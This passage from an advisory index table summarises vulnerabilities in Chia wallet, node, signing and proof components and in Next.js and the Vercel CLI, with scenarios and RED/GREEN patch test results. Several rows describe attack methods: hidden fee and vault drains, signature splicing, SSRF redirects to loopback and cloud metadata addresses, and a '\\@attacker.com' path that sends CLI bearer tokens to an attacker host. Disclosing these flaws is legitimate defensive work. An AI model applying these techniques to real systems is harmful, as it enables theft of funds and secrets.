(`CONS-SP-01` + `WLC-01`):** FullNode sync lockout followed by light-wallet fake deposit injection. | `RED`: `fake_merchant_deposit_increase_mojo: 500000000000, spend_err: UNKNOWN_UNSPENT`<br/>`GREEN`: `rejected_forged_foliage_tx_block: true, fake_increase: 0`<br/>`pytest -k test_wlc01` |
| **21** | [`21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md`](advisories/zh-CN/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md)<br/>`CHIA-WLC-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/wallet/wallet_node.py:725-777`<br/>`chia/wallet/wallet_state_manager.py:1735-1778` | `CWE-345 / CWE-400`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `wallet_node.py:725-777` and `wallet_state_manager.py:1735-1778` persist unverified `RespondRemovals(proofs=None)` / `spent_height` transitions into SQLite `WalletCoinStore`.<br/>**Scenario A (Clawback Cancel Lockout):** Victim cannot cancel a `0.5 XCH` Clawback coin (`tx_count: 0`); attacker claims on-chain after timelock expiry (`33361e6b...`).<br/>**Scenario B (`WLC-02` + `VR-01` Unified Chain):** Simultaneously locks live wallet cancellation and emergency `chia-vault-recover` CLI on one timeline (`t0..t4`).<br/>**Scenario C (UTXO Freeze DoS):** Freezes unspent coins across cold SQLite restarts. | `RED`: `t1_cold_reloaded_sqlite_spent: true, t2_sender_cancel_tx_count: 0, t4_recipient_claim_succeeded: true`<br/>`GREEN`: `t1_spent: false, t2_sender_cancel_tx_count: 1`<br/>`pytest -k test_wlc02` |
| **22** | [`22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md`](advisories/zh-CN/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md)<br/>`CHIA-GUI-WC-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain-gui** (`<= 2.6.1-rc2.dev60`)<br/>`packages/gui/src/components/walletConnect/WalletConnectContext.tsx:314-441`<br/>`constants/WalletConnectCommands.ts` | `CWE-367 / CWE-285`<br/>**8.8 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` | **How It Happens in Code:** `WalletConnectContext.tsx:314-441` exposes all 29 commands on connect, lacks a FIFO confirmation queue, and fails to re-verify `(requestId, fingerprint, network, pairing)` in `sendCommand`.<br/>**Scenario A (Modal Overwrite Drain):** A dApp overwrites a benign `chia_getCurrentAddress` prompt with `chia_sendTransaction`, draining `0.5 XCH` (`SpendBundle d2ce2264...`).<br/>**Scenario B (Fingerprint TOCTOU):** Approval on burner key `111111` executes on main key `999999`.<br/>**Scenario C (Post-Disconnect Execution):** Pending request executes after pairing/network change. | `RED`: `modal_overwritten: true, unauthorized_spend_bundle_sha256: d2ce22645a9a23b1...`<br/>`GREEN`: `6/6 distinct WSS packets blocked`<br/>`pytest -k gui_wc01` |
| **23** | [`23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md`](advisories/zh-CN/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md)<br/>`CHIA-DL-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/rpc/wallet_rpc_api.py:4066-4120` (`dl_verify_proof`)<br/>`chia/data_layer/data_layer_util.py` | `CWE-347 / CWE-345`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N` | **How It Happens in Code:** `WalletRpcApi.dl_verify_proof` (`wallet_rpc_api.py:4066-4120`) verifies coin existence and Merkle hashes without checking `match_dl_singleton` or `launcher_id == store_id`.<br/>**Scenario A (`100,000 CAT` On-Chain Mint):** A 1-mojo non-singleton coin (`86ec0dd7...`) forges `store_id` `806a6c73...`, passing `dl_verify_proof` and minting `100,000 CAT` on-chain (`dc3f0bba...`).<br/>**Scenario B (Intrinsic RPC Bypass):** Side-by-side canonical vs. counterfeit `DLProof` both return `verified: true` in `RED`.<br/>**Scenario C (Registry Spoofing):** Forges audit proofs for any official DataLayer `store_id`. | `RED`: `counterfeit_verified: true, attacker_cat_balance_mojo: 100000000`<br/>`GREEN`: `counterfeit_verified: false, attacker_cat_balance_mojo: 0`<br/>`pytest -k dl01` |
| **24** | [`24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md`](advisories/zh-CN/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md)<br/>`CHIA-CS-01 (POC-1 & POC-2)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs`<br/>`crates/chia-sdk-driver/src/clear_signing/tests.rs` | `CWE-451 / CWE-345`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `clear_signing.rs` ignores `Condition::Other` CLVM conditions (such as overlong `RESERVE_FEE` opcode `52`) that consensus CLVM executes.<br/>**Scenario A (`750 XCH` Hidden Fee Drain):** `SpendBundle` `b9b614d0...` displays `reserved_fee: 0` in Clear-Signing while draining `750 XCH` (`750,000,000,000,000 mojo`) in consensus.<br/>**Scenario B (NFT State Spoofing):** `SpendBundle` `17d2796f...` alters NFT state invisibly.<br/>**Scenario C (Fail-Closed Patch):** `GREEN` rejects non-canonical conditions before signing. | `RED`: `displayed_fee_mojo: 0, consensus_fee_drained_mojo: 750000000000000`<br/>`GREEN`: `rejected_non_canonical_condition: true`<br/>`cargo test clear_signing::tests` |
| **25** | [`25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md`](advisories/zh-CN/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md)<br/>`CHIA-CS-02 (POC-3)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (`NEW_METADATA_INFO` evaluation) | `CWE-451 / CWE-345`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` ignores extra consensus conditions (`RESERVE_FEE`) emitted by an NFT `NEW_METADATA_INFO` updater program.<br/>**Scenario A (`500 XCH` Hidden NFT Fee):** `SpendBundle` `b314b6d7...` (`3,300B`) shows `reserved_fee = 0` in Clear-Signing while draining `500 XCH` on-chain.<br/>**Scenario B (Trojan NFT Updater):** Custom updater triggers hidden fee during vault NFT operations.<br/>**Scenario C (`GREEN` Patch):** Rejects non-pure metadata updater conditions. | `RED`: `displayed_fee_mojo: 0, consensus_fee_drained_mojo: 500000000000000`<br/>`GREEN`: `rejected_impure_metadata_updater: true`<br/>`cargo test clear_signing::tests` |
| **26** | [`26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md`](advisories/zh-CN/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md)<br/>`CHIA-CS-03 (POC-4)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (dependent offer leg aggregation) | `CWE-682 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` merges dependent offer settlement legs via set intersection, dropping disjoint payment legs.<br/>**Scenario A (`500 XCH` Omitted Offer Leg):** Vault spend `3c55638a...` + settlement spend `7c05b725...` transfers `500 XCH` (`500,000,000,000,000 mojo`) omitted from Clear-Signing.<br/>**Scenario B (Treasury Swap Drain):** Disjoint notarized payment drains treasury funds.<br/>**Scenario C (`GREEN` Patch):** Enforces full union accounting across all legs. | `RED`: `omitted_settlement_outflow_mojo: 500000000000000`<br/>`GREEN`: `full_outflow_accounted_or_rejected: true`<br/>`cargo test clear_signing::tests` |
| **27** | [`27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md`](advisories/zh-CN/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md)<br/>`CHIA-CS-04 (POC-5)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (unrevealed settlement output handling) | `CWE-345 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` allows creating a `SETTLEMENT_PAYMENT_HASH` coin without revealing its spend in the signing bundle.<br/>**Scenario A (`600 XCH` Unrevealed Settlement):** Victim signs `a9eeda2c...` (`1,303B`); attacker attaches settlement spend `e0b876fb...` (`388B`) and drains `600 XCH`.<br/>**Scenario B (Air-Gapped Signer Bypass):** Hardware preview shows zero external recipient.<br/>**Scenario C (`GREEN` Patch):** Rejects unrevealed settlement outputs. | `RED`: `unrevealed_settlement_accepted: true, hidden_outflow_mojo: 600000000000000`<br/>`GREEN`: `rejected_unrevealed_settlement: true`<br/>`cargo test clear_signing::tests` |
| **28** | [`28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md`](advisories/zh-CN/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md)<br/>`CHIA-CS-05 (POC-6)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.38.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs`<br/>`crates/chia-sdk-bindings/src/clear_signing.rs:62` (`parse_vault_transaction`) | `CWE-682 / CWE-451`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `clear_signing.rs` and `chia_sdk_bindings::parse_vault_transaction` credit outputs from external non-vault `DropCoin` spends as vault change.<br/>**Scenario A (`1,000 XCH` FFI Vault Drain):** `SpendBundle` `aa651822...` (`1,477B`) drains `1,000 XCH` (`1,000,000,000,000,000 mojo`) while reporting `0` net vault loss across the FFI boundary.<br/>**Scenario B (Multi-Sig Deception):** All cosigners see the spoofed change summary.<br/>**Scenario C (`GREEN` FFI Test):** Rejects with `Error::NonStandardInnerSpend`. | `RED`: `ffi_parse_vault_tx_accepted: true, masked_vault_drain_mojo: 1000000000000000`<br/>`GREEN`: `Err(NonStandardInnerSpend)`<br/>`cargo test --test clear_signing_ffi_proof` |
| **29** | [`29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md`](advisories/zh-CN/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md)<br/>`CHIA-CS-06 (POC-7)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (offer pre-split coin destination binding) | `CWE-347 / CWE-451`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `clear_signing.rs` accepts offer pre-split child spends that are not cryptographically bound by an announcement to the signed vault spend.<br/>**Scenario A (`1,000 XCH` Post-Signature Splicing):** Victim signs `476b8e83...` (`1,994B`); attacker splices `5b3a3b21...` (`1,701B`) and redirects `1,000 XCH` under the same BLS signature.<br/>**Scenario B (Mempool Replacement):** Unbound child spend replaced in transit.<br/>**Scenario C (`GREEN` Patch):** Enforces cryptographic announcement binding. | `RED`: `pre_split_sha256: 476b8e83..., spliced_sha256: 5b3a3b21..., redirected_mojo: 1000000000000000`<br/>`GREEN`: `rejected_unbound_presplit: true`<br/>`cargo test clear_signing::tests` |
| **30** | [`30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md`](advisories/zh-CN/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md)<br/>`CHIA-CS-07 (POC-8)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (Clawback `sender_puzzle_hash` ownership check) | `CWE-345 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` does not verify that a Clawback output's `sender_puzzle_hash` belongs to the signing vault.<br/>**Scenario A (`1,000 XCH` Reverse Clawback):** `SpendBundle` `6897c10e...` (`1,218B`) sets the attacker as `sender_puzzle_hash`, letting the attacker immediately claw back `1,000 XCH`.<br/>**Scenario B (Self-Transfer Illusion):** Victim is set as receiver while attacker holds instant clawback rights.<br/>**Scenario C (`GREEN` Patch):** Enforces `sender_puzzle_hash` ownership. | `RED`: `attacker_set_as_clawback_sender: true, hijacked_mojo: 1000000000000000`<br/>`GREEN`: `rejected_foreign_clawback_sender: true`<br/>`cargo test clear_signing::tests` |
| **31** | [`31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md`](advisories/zh-CN/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md)<br/>`CHIA-CS-08 (POC-9)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (external CAT ring TAIL melt/issuance accounting) | `CWE-682 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` omits external CAT ring `RUN_TAIL` melt/issuance deltas funded by the vault's CAT spend.<br/>**Scenario A (`750 XCH`-Scale CAT Ring Drain):** `SpendBundle` `e48c3171...` (`2,541B`) drains `750,000,000,000,000` mojos via an external CAT ring melt.<br/>**Scenario B (Redemption Hijack):** External ring member absorbs vault CAT delta.<br/>**Scenario C (`GREEN` Patch):** Enforces full CAT ring conservation. | `RED`: `poc9_spend_bundle_sha256: e48c3171..., omitted_cat_ring_delta_mojo: 750000000000000`<br/>`GREEN`: `rejected_unbalanced_external_cat_ring: true`<br/>`cargo test clear_signing::tests` |
| **32** | [`32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md`](advisories/zh-CN/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md)<br/>`CHIA-VR-01 (POC-10)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-vault-recover** (`<= 1.0.0-rc9`)<br/>`src/locate.rs:148-219` (`find_launcher_id`) | `CWE-345 / CWE-400`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **How It Happens in Code:** `find_launcher_id` (`src/locate.rs:148-219`) returns the first `SINGLETON_LAUNCHER_HASH` child found at the user's address without verifying vault custody/recovery key match.<br/>**Scenario A (1-Mojo CLI Lockout):** Decoy launcher `2de44601...` causes `chia-vault-recover` (`1.0.0-rc9`) to abort with `recovery phrase does not match`.<br/>**Scenario B (`WLC-02` + `VR-01` Chain):** Blocks both GUI and CLI recovery.<br/>**Scenario C (`GREEN` Release Binary):** Recovers true launcher `e53d0c41...` (`45/45` tests pass). | `RED`: `selected_launcher: 2de44601... (decoy), cli_exit_code: 1`<br/>`GREEN`: `selected_launcher: e53d0c41... (victim), cli_exit_code: 0`<br/>`pytest -k poc10` |
| **33** | [`33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md`](advisories/zh-CN/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md)<br/>`CHIA-CONS-SP-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/full_node/full_node.py:2220-2310` (`new_peak` / `sync_from_fork_point`) | `CWE-400 / CWE-345`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` | **How It Happens in Code:** `full_node.py:2220-2310` aborts `sync_from_fork_point` on invalid sub-epoch/weight-proof responses without disconnecting the peer.<br/>**Scenario A (Port `8444` Sync Lockout):** 3-node mTLS proof keeps victim `peak` at `None` despite an honest peer at `height=5`.<br/>**Scenario B (`10,000 XCH` Reorg Double-Spend):** `Branch A` (`26afe149...`) credits exchange `+10,000 XCH`; `Branch B` (`ad2eba4d...`) reorgs exchange balance to `0`.<br/>**Scenario C (`GREEN` Patch):** Disconnects offending peer & enforces `min_confirmations=32`. | `RED`: `victim_peak: None, reorg_exchange_loss_mojo: 10000000000000000`<br/>`GREEN`: `victim_synced_height: 5, exchange_loss_mojo: 0`<br/>`pytest -k reorg` |
| **34** | [`34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md`](advisories/zh-CN/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md)<br/>`CHIA-WLT-OFFER-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/rpc/wallet_rpc_api.py` (`take_offer`)<br/>`chia/wallet/trade_manager.py` (`respond_to_offer`) | `CWE-863`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `take_offer` / `respond_to_offer` selects and signs wallet coins for requested offer payments without enforcing a per-asset `max_authorized_amount` cap.<br/>**Scenario A (Taker Bot Excess Spend):** External Offer induces coin selection above expected quote.<br/>**Scenario B (Hidden Multi-Asset Leg):** CAT/NFT offer silently pulls XCH from wallet.<br/>**Scenario C (`GREEN` Patch):** Enforces explicit per-asset spend cap. | `RED`: `unbounded_implicit_coin_spend_signed: true`<br/>`GREEN`: `exceeded_max_authorized_amount_rejected: true`<br/>`pytest -k wallet` |
| **35** | [`35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md`](advisories/zh-CN/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md)<br/>`CHIA-POS-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/farmer/farmer_api.py:85-185` (`FarmerAPI.new_proof_of_space`)<br/>`chiapos` Rust FFI (`size_v2` / `get_quality_string`) | `CWE-248 / CWE-20`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **How It Happens in Code:** `FarmerAPI.new_proof_of_space` (`farmer_api.py:85-185`) calls Rust FFI `size_v2()` / `get_quality_string()` before validating pool key XOR exclusivity and `check_plot_param`.<br/>**Scenario A (4/4 Farmer Cluster Crash):** Single 445-byte wire packet (`30a0e918...`) triggers `pyo3_runtime.PanicException` and terminates all 4 Farmer processes (`exit_code=1`).<br/>**Scenario B (Slice OOB Panic):** Truncated proof triggers `range end index 36 out of range for slice of length 32`.<br/>**Scenario C (`GREEN` Patch):** `4/4` Farmers survive (`exit_code=0`). | `RED`: `packet_bytes: 445, crashed_farmers: 4/4, PanicException`<br/>`GREEN`: `crashed_farmers: 0/4, alive_farmers: 4`<br/>`pytest -k farmer` |
| **36** | [`36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/zh-CN/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)<br/>`CHIA-POS-02..04`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiapos** (`<= 2.0.11`)<br/>`src/verifier.hpp:48-108` (`Verifier::ValidateProof`)<br/>`src/bits.hpp:184`<br/>`src/prover_disk.hpp:254-322` (`DiskProver`) | `CWE-190 / CWE-787 / CWE-125`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` | **How It Happens in Code:** `Verifier::ValidateProof` (`src/verifier.hpp`, `src/bits.hpp:184`) overflows bit offsets at `k=50` (Table 4) and `k>=60`, and `DiskProver` (`src/prover_disk.hpp`) truncates 64-bit plot table sizes to 32-bit.<br/>**Scenario A (Crafted `.plot` Heap Overflow):** Loading a crafted `.plot` file triggers 64-to-32-bit truncation heap corruption.<br/>**Scenario B (`k=50` / `k=60` Stack OOB):** Verified via ASan/UBSan `chiapos_k_probe` (`exit_code=1`).<br/>**Scenario C (`GREEN` Patch):** Bounds-checked (`exit_code=0`). | `RED`: `k50_table4_asan_exit: 1, k60_asan_exit: 1 (src/bits.hpp:184 OOB)`<br/>`GREEN`: `exit_code: 0, rejected_cleanly: true`<br/>`pytest -k chiapos` |
| **37** | [`37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/zh-CN/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)<br/>`CHIA-VDF-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiavdf** (`<= 1.1.11`)<br/>`src/verifier.cpp` (`CheckProofOfTimeNWesolowski`)<br/>`src/prover_slow.h` | `CWE-125 / CWE-416`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **How It Happens in Code:** `CheckProofOfTimeNWesolowski` (`src/verifier.cpp`) slices `proof_blob` without validating `proof_blob_len` or `num_iterations > 0`.<br/>**Scenario A (Verifier OOB Crash):** Truncated VDF proof triggers native C++ out-of-bounds read.<br/>**Scenario B (Teardown UAF):** Worker thread accesses freed state in `prover_slow.h`.<br/>**Scenario C (`GREEN` Patch):** Returns `false` cleanly on malformed VDF proofs. | `RED`: `asan_oob_or_segv: true, exit_code: 1`<br/>`GREEN`: `asan_oob_or_segv: false, verified: false`<br/>`chiavdf ASan harness` |
| **38** | [`38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/zh-CN/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)<br/>`CHIA-DL-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/data_layer/download_data.py`<br/>`chia/data_layer/data_layer.py` | `CWE-918`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `download_data.py` fetches DataLayer mirror URLs with `allow_redirects=True` and no loopback/private IP validation on redirect hops.<br/>**Scenario A (Internal Loopback/Metadata SSRF):** A `302` redirect on an announced mirror URL hits `127.0.0.1` / `169.254.169.254`.<br/>**Scenario B (Replica Fleet Scanning):** Subscribed nodes poll redirected internal hosts.<br/>**Scenario C (`GREEN` Patch):** Blocks redirects to private/loopback IPs. | `RED`: `redirect_to_loopback_followed: true, internal_hit_count: 1`<br/>`GREEN`: `redirect_to_loopback_followed: false, internal_hit_count: 0`<br/>`pytest -k dl02` |
| **39** | [`39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/zh-CN/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)<br/>`VERCEL-NEXT-15`<br/>MITRE CNA-LR & HackerOne #4152250 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`<br/>`packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201` | `CWE-200 / CWE-918 / CWE-345`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `createRedirectRenderResult()` (`action-handler.js:278-303`) fetches Server Action redirect targets without `redirect: 'manual'`, following external `302` hops with `x-next-revalidate-tag-token` (`previewModeId`) and piping external RSC Flight streams back under a same-origin `x-action-redirect`. Omitting `"b"` in Flight data bypasses `server-action-reducer.js:161` Build ID checks (`UXSS`).<br/>**Scenario A (SSO/OIDC `previewModeId` Theft):** Multi-tenant SSO login Server Action leaks `previewModeId` to tenant IdP.<br/>**Scenario B (Global ISR Cache Wiping):** Stolen `previewModeId` authorizes `x-prerender-revalidate` cache purging.<br/>**Scenario C (Same-Origin RSC Flight UXSS):** OAuth bounce `302` injects forged RSC Virtual DOM (`response.b === undefined`) and CORS headers into `victim-app.com`. | `RED`: `leaked_previewModeId: f5dbbd8f6a6a51a6aa8ff1443f7090dd, client_build_id_check_bypassed: true, flight_uxss: true`<br/>`GREEN`: `redirect: 'manual', external_hop_followed: false`<br/>HackerOne `#4152250` (+2 Comments) |
| **40** | [`40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/zh-CN/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)<br/>`VERCEL-NEXT-09`<br/>MITRE CNA-LR & HackerOne #4152265 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/image-optimizer.ts:696-729`<br/>`packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`) | `CWE-918 / CWE-863`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `fetchExternalImage()` (`image-optimizer.js:586-615`) checks `remotePatterns` only on hop 1, not on `3xx` redirects (`09A`). In `validateUrl()`, `isPrivateIp(ip)` fails open (`if (!ipaddr.isValid(ip)) return false`) on Linux hyphenated IPv6 zone indices (`::ffff:127.0.0.1%br-...`) and classifies `::7f00:1` and `64:ff9b:1::/48` as `unicast` (`09B`).<br/>**Scenario A (Same-Host Pathname Bypass):** `/public-avatars/**` redirects to `/private-kyc-docs/passport-scan.png`.<br/>**Scenario B (Cross-Host Allowlist Pivot):** Allowlisted CDN/avatar service redirects to unapproved internal host.<br/>**Scenario C (`09A -> 09B` Direct `127.0.0.1` TCP Loopback SSRF):** Redirects to `::ffff:127.0.0.1%br-...` / `::7f00:1` to read `127.0.0.1` services. | `RED`: `remotePatterns_bypassed: true, loopback_server_hit: true, remote_addr: ::ffff:127.0.0.1`<br/>`GREEN`: `redirect_rechecked: true, fail_closed: true`<br/>HackerOne `#4152265` (+2 Comments) |
| **41** | [`41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/zh-CN/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)<br/>`VERCEL-CLI-07`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`vercel <= 65.4.0`)<br/>`packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`<br/>`packages/cli/src/commands/http-cli/index.ts` | `CWE-200 / CWE-436`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `constructFullUrl()` (`packages/cli/src/commands/curl/utils.ts:179-216`) checks `new URL(normalizedPath, baseUrl).origin === baseUrl` but returns raw `${baseUrl}${normalizedPath}`. For `\\@attacker.com`, WHATWG `URL` keeps `origin === baseUrl`, whereas `libcurl` treats `baseUrl\\` as userinfo and `attacker.com` as host.<br/>**Scenario A (CI/CD Token Exfiltration):** `vercel curl` sends `Authorization: Bearer` and `x-vercel-protection-bypass` to `attacker.com`.<br/>**Scenario B (Developer/Agent CLI Leak):** Malicious path steals live CLI session token.<br/>**Scenario C (Auto-Minted Bypass Leak):** `PATCH /v10/projects/{id}/protection-bypass` mints and leaks project secret. | `RED`: `whatwg_origin_check_passed: true, curl_connected_to_attacker: true, leaked_bearer: true`<br/>`GREEN`: `rejected_backslash_and_globoff: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
